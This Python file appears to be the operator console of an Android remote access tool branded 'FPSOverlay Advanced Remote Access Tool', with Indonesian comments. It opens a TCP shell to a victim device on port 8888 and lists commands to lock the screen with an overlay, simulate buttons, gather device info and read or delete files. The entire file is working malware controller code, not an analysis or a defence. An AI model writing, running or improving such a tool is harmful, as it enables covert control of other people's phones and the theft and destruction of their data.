import socket
import sys
import os
import subprocess

# Auto-install dependencies function
def install_dependencies():
    # Tambahkan library jika diperlukan
    required_packages = []
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"[*] Installing dependency: {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def send_command(ip, port, cmd):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((ip, port))
            # Tambahkan newline agar readLine() di Java terbaca
            s.sendall((cmd + "\n").encode())

            data = b""
            while True:
                try:
                    part = s.recv(4096)
                    if not part: break
                    data += part
                    if len(part) < 4096: break
                except socket.timeout:
                    break
            return data.decode().strip()
    except Exception as e:
        return f"Error: {e}"

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    \033[91m
     _  _  ____  ____    ___   __   __ _  ____  __   __    ____
    ( \/ )(  _ \(  _ \  / __) /  \ (  ( \/ ___)/  \ (  )  (  __)
     )  (  ) __/ )   / ( (__ (  O )/    /\___ \  O )/ (_/\ ) _)
    (_/\_)(__)  (__\_)  \___) \__/ \_)__)(____/\__/ \____/(____)
    \033[0m
    [+] FPSOverlay Advanced Remote Access Tool
    [+] Mode: Ubuntu-Style Shell (Lower Case Supported)
    """)

def main():
    install_dependencies()

    if len(sys.argv) < 2:
        target_ip = input("\033[92m[?]\033[0m Enter Target IP: ")
    else:
        target_ip = sys.argv[1]

    print_banner()
    # Inisialisasi direktori
    current_dir = send_command(target_ip, 8888, "pwd")

    while True:
        try:
            if not current_dir or "Error" in str(current_dir):
                print(f"\033[91m[!]\033[0m Connection lost or IP unreachable.")
                target_ip = input("\033[92m[?]\033[0m Re-enter Target IP (or 'exit'): ")
                if target_ip.lower() == "exit": break
                current_dir = send_command(target_ip, 8888, "pwd")
                continue

            # Prompt ala Ubuntu: user@device:path$
            prompt = f"\033[92mrat@android\033[0m:\033[94m{current_dir}\033[0m$ "
            cmd_input = input(prompt).strip()

            if not cmd_input:
                continue

            cmd_lower = cmd_input.lower()

            if cmd_lower == "help":
                print("""
                Core Commands
                =============
                lock/unlock    Toggle screen overlay
                vibrate        Device vibration
                home/back      Simulate hardware buttons
                info           Get device hardware info
                screen         Get foreground app
                message <text> Show Toast message

                File System Commands (Ubuntu-Style)
                ====================
                ls             List files
                cd <dir>       Change directory
                pwd            Print current path
                cat <file>     Read file content
                rm <file>      Delete file

                System Commands
                ===============
                clear          Clear terminal screen
                exit           Terminate session
                """)
            elif cmd_lower == "clear":
                os.system('clear' if os.name == 'posix' else 'cls')
            elif cmd_lower == "exit":
                print("[*] Closing session...")
                break
            elif cmd_lower.startswith("cd "):
                res = send_command(target_ip, 8888, cmd_input)
                if "ERROR" in res:
                    print(f"\033[91m{res}\033[0m")
                # Update current_dir setelah pindah folder
                current_dir = send_command(target_ip, 8888, "pwd")
            else:
                res = send_command(target_ip, 8888, cmd_input)
                print(res)

        except KeyboardInterrupt:
            print("\n[*] Logout.")
            break
        except Exception as e:
            print(f"[*] Unexpected error: {e}")
            break

if __name__ == "__main__":
    main()
